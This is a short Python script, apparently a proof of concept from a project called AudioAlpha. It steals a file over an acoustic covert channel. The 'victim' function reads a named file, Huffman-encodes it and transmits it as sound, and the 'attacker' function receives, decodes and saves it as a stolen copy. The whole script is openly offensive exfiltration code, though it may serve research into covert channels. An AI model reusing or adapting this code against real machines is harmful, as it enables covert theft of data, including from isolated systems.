import huffman.huffman as huffman
import huffman.freq as freq
from sound.sound_decoder import *
import textwrap

FILE_TO_STEAL = '/home/yaniv/PycharmProjects/AudioAlpha/data/myCodes.txt'
STOLEN_FILE = '/home/yaniv/PycharmProjects/AudioAlpha/data/hisCodes.txt'

def victim(sound_send,sound_recv):
    with open(FILE_TO_STEAL) as f:
        data = f.read()
    huffman_data = huffman.huffman_decimal_encode(data)
    sendAudioPacket(huffman_data, sound_send,sound_recv)

def attacker(sound_send,sound_recv):
    huffman_data = recvAudioPacket(sound_send,sound_recv)
    if (huffman_data != ''):
        data = huffman.huffman_decimal_decode(huffman_data)
        print(data)
        fd = open(STOLEN_FILE, 'w')
        fd.write(data)
        fd.close()
    else:
        print('attacker() got huffman_data null')

def main():
    # if len(sys.argv) == 2 and sys.argv[1] == 'v':
    #     victim()
    # else:
    #     attacker()
    sound_send = Encoder()
    sound_recv = Decoder()

    victim(sound_send,sound_recv)
    #attacker(sound_send,sound_recv)

if __name__ == "__main__":
   main()